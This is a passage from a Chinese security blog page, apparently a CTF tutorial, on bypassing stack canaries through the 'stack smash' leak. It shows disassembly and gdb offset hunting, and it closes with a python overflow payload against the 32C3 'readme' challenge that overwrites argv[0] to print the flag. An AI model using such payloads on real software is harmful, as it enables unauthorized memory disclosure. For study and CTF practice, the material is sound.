@@ -1,0 +1,1440 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-CN">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="二进制安全,pwn,栈溢出," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="将消失勇气释放自己，就算某天我吻别人亦当亲你">
+<meta name="keywords" content="二进制安全,pwn,栈溢出">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出技巧(三)">
+<meta property="og:url" content="http://1234xxh.github.io/2021/03/14/1/index.html">
+<meta property="og:site_name" content="sh0wmak3r&#39;s Blog">
+<meta property="og:description" content="将消失勇气释放自己，就算某天我吻别人亦当亲你">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="http://1234xxh.github.io/image/N2LL/24.jpeg">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200314/image.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200314/image1.png">
+<meta property="og:image" content="http://1234xxh.github.io/image/20200314/image2.png">
+<meta property="og:updated_time" content="2021-03-25T08:33:29.763Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="栈溢出技巧(三)">
+<meta name="twitter:description" content="将消失勇气释放自己，就算某天我吻别人亦当亲你">
+<meta name="twitter:image" content="http://1234xxh.github.io/image/N2LL/24.jpeg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":true,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1234xxh.github.io/2021/03/14/1/"/>
+
+
+
+
+
+  <title>栈溢出技巧(三) | sh0wmak3r's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+<!-- 页面点击小红心 -->
+<script type="text/javascript" src="/js/src/love.js"></script>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <!-- <div class="headband"></div> -->
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">sh0wmak3r's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle">safe | smart contract | binary</p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            Archives
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            Search
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="Searching..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1234xxh.github.io/2021/03/14/1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="bey0ndm3">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/background.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="sh0wmak3r's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">栈溢出技巧(三)</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2021-03-14T22:03:03+08:00">
+                2021-03-14
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+             <span id="/2021/03/14/1/" class="leancloud_visitors" data-flag-title="栈溢出技巧(三)">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">Visitors&#58;</span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>将消失勇气释放自己，就算某天我吻别人亦当亲你</p>
+<p><img src="/image/N2LL/24.jpeg" alt="image"><br><a id="more"></a></p>
+<h1 id="基于报错类的栈保护"><a href="#基于报错类的栈保护" class="headerlink" title="基于报错类的栈保护"></a>基于报错类的栈保护</h1><p>canary这个值被称作金丝雀(“canary”)值，指的是矿工曾利用金丝雀来确认是否有气体泄漏，如果金丝雀因为气体泄漏而中毒死亡，可以给矿工预警。在brop中也提到过，通过爆破的办法去进行绕过canary保护，因为canary的值在每次程序运行时都是不同的，所以这需要一定的条件：fork的子进程不变，题目中很难遇到，所以我们可以使用stack smash的方法进行泄漏内容。<br>canary位置位于高于局部变量，低于ESP，也就是在其中间，那么我们进行溢出攻击的时候，都会覆盖到canary的值，从而导致程序以外结束。<br>具体看一下canary在哪？怎么形成的？又是怎么使用的？<br>举一个小例子：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main(int argc, char **argv) &#123;</span><br><span class="line">    char buf[10];</span><br><span class="line">    scanf(&quot;%s&quot;, buf);</span><br><span class="line">&#125;</span><br><span class="line">pwn@pwn-PC:~/Desktop$ gcc test.c -fstack-protector</span><br></pre></td></tr></table></figure></p>
+<p>看一下其汇编代码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x0000000000000740 &lt;+0&gt;: push   rbp</span><br><span class="line">   0x0000000000000741 &lt;+1&gt;: mov    rbp,rsp</span><br><span class="line">   0x0000000000000744 &lt;+4&gt;: sub    rsp,0x30</span><br><span class="line">   0x0000000000000748 &lt;+8&gt;: mov    DWORD PTR [rbp-0x24],edi</span><br><span class="line">   0x000000000000074b &lt;+11&gt;:    mov    QWORD PTR [rbp-0x30],rsi</span><br><span class="line">   0x000000000000074f &lt;+15&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000000758 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">   0x000000000000075c &lt;+28&gt;:    xor    eax,eax</span><br><span class="line">   0x000000000000075e &lt;+30&gt;:    lea    rax,[rbp-0x12]</span><br><span class="line">   0x0000000000000762 &lt;+34&gt;:    mov    rsi,rax</span><br><span class="line">   0x0000000000000765 &lt;+37&gt;:    lea    rdi,[rip+0xb8]        # 0x824</span><br><span class="line">   0x000000000000076c &lt;+44&gt;:    mov    eax,0x0</span><br><span class="line">   0x0000000000000771 &lt;+49&gt;:    call   0x5f0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0000000000000776 &lt;+54&gt;:    mov    rax,QWORD PTR [rbp-0x30]</span><br><span class="line">   0x000000000000077a &lt;+58&gt;:    lea    rdx,[rip+0xa6]        # 0x827</span><br><span class="line">   0x0000000000000781 &lt;+65&gt;:    mov    QWORD PTR [rax],rdx</span><br><span class="line">   0x0000000000000784 &lt;+68&gt;:    nop</span><br><span class="line">   0x0000000000000785 &lt;+69&gt;:    mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x0000000000000789 &lt;+73&gt;:    xor    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000000792 &lt;+82&gt;:    je     0x799 &lt;main+89&gt;</span><br><span class="line">   0x0000000000000794 &lt;+84&gt;:    call   0x5e0 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x0000000000000799 &lt;+89&gt;:    leave  </span><br><span class="line">   0x000000000000079a &lt;+90&gt;:    ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure></p>
+<p>找到&lt;+15&gt; &lt;+24&gt;和&lt;+69&gt;&lt;+73&gt;处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">   0x000000000000074f &lt;+15&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   0x0000000000000758 &lt;+24&gt;:    mov    QWORD PTR [rbp-0x8],rax</span><br><span class="line">.....</span><br><span class="line">   0x0000000000000785 &lt;+69&gt;:    mov    rax,QWORD PTR [rbp-0x8]</span><br><span class="line">   0x0000000000000789 &lt;+73&gt;:    xor    rax,QWORD PTR fs:0x28</span><br></pre></td></tr></table></figure></p>
+<p>前两处是生成canary并且存在[rbp-0x8]中，怎是通过从fs:0x28的地方获取的，而且发现每次都会变化，无法预测。后两处则是程序执行完成后对[rbp-0x8]canary值与fs:0x28的值进行比较，如果xor操作后rax寄存器中值为0，那么程序自己就认为是没有被破坏，否则调用__stack_chk_fail函数。继续看该函数的内容和作用，会引出stack smash利用技巧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> __attribute__ ((noreturn)) </span><br><span class="line">__stack_chk_fail (void) &#123;   </span><br><span class="line">    __fortify_fail (&quot;stack smashing detected&quot;); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void __attribute__ ((noreturn)) </span><br><span class="line">__fortify_fail (msg)</span><br><span class="line">   const char *msg; &#123;</span><br><span class="line">      /* The loop is added only to keep gcc happy. */</span><br><span class="line">         while (1)</span><br><span class="line">              __libc_message (2, &quot;*** %s ***: %s terminated\n&quot;, msg, __libc_argv[0] ?: &quot;&lt;unknown&gt;&quot;) </span><br><span class="line">&#125; </span><br><span class="line">libc_hidden_def (__fortify_fail)</span><br></pre></td></tr></table></figure></p>
+<p>最终会调用<strong>fortify_fail函数中的</strong>libc_message (2, “<strong><em> %s </em></strong>: %s terminated\n”, msg, <strong>libc_argv[0] ?: “<unknown>“) ，关键点来了。<br>一、可以打印信息<br>二、</unknown></strong>libc_argv[0]可控制<br>那么<strong>libc_argv[0]是什么呢？与打印信息又什么联系？
+</strong>libc_argv[0]则是<em> argv[ ]指针组的的元素，先看 main函数的原型，void main(int argc, char **argv)。其中参数argc是整数，表示使用命令行运行程序时传递了几个参数；</em> argv[ ]是一个指针数组，用来存放指向你的字符串参数的指针，每一个元素指向一个参数。其中argv[0]指向程序运行的全路径名，也就是程序的名字，比如例子中的./a.out，argv[1] 指向在命令行中执行程序名后的第一个字符串，以此类推。但是这样看来，__libc_argv[0]似乎是不可以控制的，或者只能使用修改程序名来进行控制。<br>继续看这么一个小实验，先看一下这个错误信息是怎么打印的（至于为什么是输出50个字节，随后再探究）。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*50&apos; | ./a.out</span><br><span class="line">*** stack smashing detected ***: ./a.out terminated</span><br><span class="line">段错误</span><br></pre></td></tr></table></figure></p>
+<p>如果我们在程序中强行修改__libc_argv[0]会怎么样？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">void main(int argc, char **argv) &#123;</span><br><span class="line">    char buf[10];</span><br><span class="line">    scanf(&quot;%s&quot;, buf);</span><br><span class="line">    argv[0] = &quot;stack smash!&quot;;</span><br><span class="line">&#125;</span><br><span class="line">pwn@pwn-PC:~/Desktop$ gcc test.c -fstack-protector</span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*50&apos; | ./a.out</span><br><span class="line">*** stack smashing detected ***: stack smash! terminated</span><br><span class="line">段错误</span><br></pre></td></tr></table></figure></p>
+<p>可以发现成功控制了__libc_argv[0]的值，打印出来了想要的信息。<br>综上所述，这一种基于报错类的栈保护，恰恰是可以报错，所以存在stack smash的绕过方法。</p>
+<h1 id="stack-smash原理"><a href="#stack-smash原理" class="headerlink" title="stack smash原理"></a>stack smash原理</h1><p>调试<strong>fortify_fail 函数，找到</strong>libc_message函数的部分汇编代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x7ffff7b331d0 &lt;__fortify_fail+16&gt;    mov    rax, qword ptr [rip + 0x2a5121] &lt;0x7ffff7dd82f8&gt;</span><br></pre></td></tr></table></figure></p>
+<p>然后获取[rip+0x2a5121]的值，也就是存放__libc_argv[0]的内存单元。<br><img src="/image/20200314/image.png" alt="image"></p>
+<p>对于这个例子来说，输入的长度达到0xf8字节，即可开始覆盖__libc_argv[0]的值，从而打印出来需要的信息，构造就相应的payload就行泄漏想要的内容，比如存储的flag内容、开启PIE的加载基址、canary的值等等。<br>在一节里面，拿刚才的例子再做一个有意思的小实验：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*247&apos; | ./a.out</span><br><span class="line">*** stack smashing detected ***: ./a.out terminated</span><br><span class="line">段错误</span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*248&apos; | ./a.out</span><br><span class="line">*** stack smashing detected ***:  terminated</span><br><span class="line">段错误</span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*249&apos; | ./a.out</span><br><span class="line">*** stack smashing detected ***:  terminated</span><br><span class="line">段错误</span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*250&apos; | ./a.out</span><br><span class="line">段错误</span><br></pre></td></tr></table></figure></p>
+<p>buf(0x7fffffffcd00)和__libc_argv<a href="0x7fffffffcdf8">0</a>处相距0xf8（也就是说第249位会覆盖到0x7fffffffcdf8），那么输入247、248、249、250会出现三种情况，分别看一下对应情况下0x7fffffffcdf8的值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">达不到覆盖的距离：    </span><br><span class="line">21:0108│      0x7fffffffcdf8 —▸ 0x7fffffffd0d2 ◂— &apos;/home/pwn/Desktop/a.out&apos;</span><br><span class="line">刚好达到覆盖的距离，读入\x00刚好覆盖到：</span><br><span class="line">21:0108│      0x7fffffffcdf8 —▸ 0x7fffffffd000 ◂— 9 /* &apos;\t&apos; */</span><br><span class="line">覆盖形成的地址在内存中可以找到：</span><br><span class="line">21:0108│      0x7fffffffcdf8 —▸ 0x7fffffff0041 ◂— 0x0</span><br><span class="line">Cannot access memory at address 0x7fffff004141：</span><br><span class="line">21:0108│      0x7fffffffcdf8 ◂— 0x7fffff004141 /* &apos;AA&apos; */</span><br></pre></td></tr></table></figure></p>
+<p>因此在尝试寻找offset的时候，选择offset = 248。当然尝试的办法太慢了，直接gdb调试下断点，类似于例子中的distance 0x7fffffffcd00 0x7fffffffcdf8即可。</p>
+<h1 id="题目一"><a href="#题目一" class="headerlink" title="题目一"></a>题目一</h1><p>2015 年 32C3 CTF readme题目分析如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 sub_4007E0()</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v0; // rbx</span><br><span class="line">  int v1; // eax</span><br><span class="line">  __int64 v3; // [rsp+0h] [rbp-128h]</span><br><span class="line">  unsigned __int64 v4; // [rsp+108h] [rbp-20h]</span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(0x28u);</span><br><span class="line">  __printf_chk(1LL, &quot;Hello!\nWhat&apos;s your name? &quot;);</span><br><span class="line">  if ( !_IO_gets(&amp;v3) )</span><br><span class="line">LABEL_9:</span><br><span class="line">    _exit(1);</span><br><span class="line">  v0 = 0LL;</span><br><span class="line">  __printf_chk(1LL, &quot;Nice to meet you, %s.\nPlease overwrite the flag: &quot;);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = _IO_getc(stdin);</span><br><span class="line">    if ( v1 == -1 )</span><br><span class="line">      goto LABEL_9;</span><br><span class="line">    if ( v1 == 10 )</span><br><span class="line">      break;</span><br><span class="line">    byte_600D20[v0++] = v1;</span><br><span class="line">    if ( v0 == 32 )</span><br><span class="line">      goto LABEL_8;</span><br><span class="line">  &#125;</span><br><span class="line">  memset((void *)((signed int)v0 + 6294816LL), 0, (unsigned int)(32 - v0));</span><br><span class="line">LABEL_8:</span><br><span class="line">  puts(&quot;Thank you, bye!&quot;);</span><br><span class="line">  return __readfsqword(0x28u) ^ v4;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ ./readme.bin </span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? aaa</span><br><span class="line">Nice to meet you, aaa.</span><br><span class="line">Please overwrite the flag: aaa</span><br><span class="line">Thank you, bye!</span><br><span class="line">pwn@pwn-PC:~/Desktop$ checksec readme.bin </span><br><span class="line">[*] &apos;/home/pwn/Desktop/readme.bin&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br><span class="line">    FORTIFY:  Enabled</span><br></pre></td></tr></table></figure></p>
+<p>程序中存在两次输入，并且可以发现_IO_gets(&amp;v3)处存在明显的栈溢出。<br>尝试找到__libc_argv[0]的位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*0x128+&quot;\n&quot;&apos;|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? Nice to meet you, AAAAAAAA...</span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***: ./readme.bin terminated</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*535+&quot;\n&quot;&apos;|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? Nice to meet you, AAAAAAAA...</span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***: ./readme.bin terminated</span><br><span class="line"></span><br><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*536+&quot;\n&quot;&apos;|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? Nice to meet you, AAAAAAAA...</span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***:   terminated</span><br></pre></td></tr></table></figure></p>
+<p>因此offset = 536。为了做题的效率，不可能去一个一个尝试，如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ find /home</span><br><span class="line">Searching for &apos;/home&apos; in: None ranges</span><br><span class="line">Found 5 results, display max 5 items:</span><br><span class="line">[stack] : 0x7fffffffd0c8 (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line">[stack] : 0x7fffffffec71 (&quot;/home/pwn/Desktop&quot;)</span><br><span class="line">[stack] : 0x7fffffffec91 (&quot;/home/pwn&quot;)</span><br><span class="line">[stack] : 0x7fffffffef29 (&quot;/home/pwn/.Xauthority&quot;)</span><br><span class="line">[stack] : 0x7fffffffefdb (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line">gdb-peda$ find 0x7fffffffd0c8</span><br><span class="line">Searching for &apos;0x7fffffffd0c8&apos; in: None ranges</span><br><span class="line">Found 2 results, display max 2 items:</span><br><span class="line">   libc : 0x7ffff7dd43b8 --&gt; 0x7fffffffd0c8 (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line">[stack] : 0x7fffffffcde8 --&gt; 0x7fffffffd0c8 (&quot;/home/pwn/Desktop/readme.bin&quot;)</span><br><span class="line">gdb-peda$ distance $rsp 0x7fffffffcde8</span><br><span class="line">From 0x7fffffffcbd0 to 0x7fffffffcde8: 536 bytes, 134 dwords</span><br><span class="line">这个计算距离只是特例，最好是按照上一部分例子中的方法来计算，下断点，distance 地址1 地址2.</span><br></pre></td></tr></table></figure></p>
+<p>可以在IDA下发现.data段的变量<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data:0000000000600D20 byte_600D20     db 33h                  ; DATA XREF: sub_4007E0+6E↑w</span><br><span class="line">.data:0000000000600D21 a2c3Theserverha db &apos;2C3_TheServerHasTheFlagHere...&apos;,0</span><br></pre></td></tr></table></figure></p>
+<p>只需要将此变量进行显示即可，于是构造payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwn@pwn-PC:~/Desktop$ python -c &apos;print &quot;A&quot;*536+__import__(&quot;struct&quot;).pack(&quot;&lt;Q&quot;,0x600d20)+&quot;\n&quot;+&apos;|./readme.bin</span><br><span class="line">Hello!</span><br><span class="line">What&apos;s your name? Nice to meet you, AAAAAAA.....</span><br><span class="line">Please overwrite the flag: Thank you, bye!</span><br><span class="line">*** stack smashing detected ***:   terminated</span><br></pre></td></tr></table></figure></p>
